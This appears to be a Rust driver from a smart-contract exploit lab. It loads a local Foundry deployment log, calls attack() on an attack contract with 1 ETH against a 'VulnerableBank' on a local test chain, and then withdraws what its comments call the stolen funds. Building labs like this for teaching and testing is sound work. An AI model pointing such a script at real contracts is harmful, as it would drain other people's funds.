//! Runs the attack script.

use alloy_network::EthereumWallet;
use alloy_primitives::{Address, Bytes, U256};
use alloy_provider::{Provider, ProviderBuilder};
use anyhow::Result;
use ploit_config::PloitConfig;
use serde::Deserialize;
use std::path::PathBuf;

#[derive(Deserialize)]
struct BroadcastLog {
    transactions: Vec<Transaction>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct Transaction {
    transaction_type: String,
    contract_address: Option<Address>,
}

/// Runs the attack.
pub async fn execute() -> Result<()> {
    tracing::info!("Executing reentrancy attack...");

    // Load config
    let config = PloitConfig::load_or_default(&PathBuf::from(".ploit.toml"))?;

    // Parse broadcast JSON to extract contract addresses
    let broadcast_path = "broadcast/Deploy.s.sol/31337/run-latest.json";
    let broadcast_json = std::fs::read_to_string(broadcast_path)?;
    let broadcast: BroadcastLog = serde_json::from_str(&broadcast_json)?;

    let mut create_addrs = broadcast
        .transactions
        .iter()
        .filter(|tx| tx.transaction_type == "CREATE")
        .filter_map(|tx| tx.contract_address);

    let _bank_address = create_addrs
        .next()
        .ok_or_else(|| anyhow::anyhow!("VulnerableBank not found"))?;
    let attack_address = create_addrs
        .next()
        .ok_or_else(|| anyhow::anyhow!("AttackContract not found"))?;

    // Create provider with signer
    let wallet = EthereumWallet::from(config.agent_signer.clone());
    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect_http(config.rpc_url.parse()?);

    // Execute attack() with 1 ETH
    let attack_selector = Bytes::from_static(&[0x9e, 0x5f, 0xaa, 0xfc]);
    let tx = provider
        .transaction_request()
        .to(attack_address)
        .input(attack_selector.into())
        .value(U256::from(1_000_000_000_000_000_000_u128))
        .gas_limit(1_000_000);

    let pending = provider.send_transaction(tx).await?;
    pending.get_receipt().await?;

    // Withdraw stolen funds
    let withdraw_selector = Bytes::from_static(&[0x4f, 0x91, 0xaf, 0x0c]);
    let tx = provider
        .transaction_request()
        .to(attack_address)
        .input(withdraw_selector.into())
        .gas_limit(100_000);

    let pending = provider.send_transaction(tx).await?;
    pending.get_receipt().await?;

    tracing::info!("Attack complete");
    Ok(())
}
